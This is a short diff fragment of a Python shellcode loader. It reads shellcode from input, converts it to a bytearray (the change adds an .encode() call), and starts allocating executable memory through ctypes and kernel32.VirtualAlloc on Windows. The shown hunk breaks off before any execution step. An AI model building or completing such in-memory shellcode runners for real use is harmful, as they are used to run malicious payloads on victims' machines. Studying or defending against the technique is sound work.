@@ -17,7 +17,7 @@ while True:
         shellcode_in += in_s
 bytearr_in = shellcode_in
 
-shellcode = bytearray(bytearr_in)
+shellcode = bytearray(bytearr_in.encode())
 
 ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
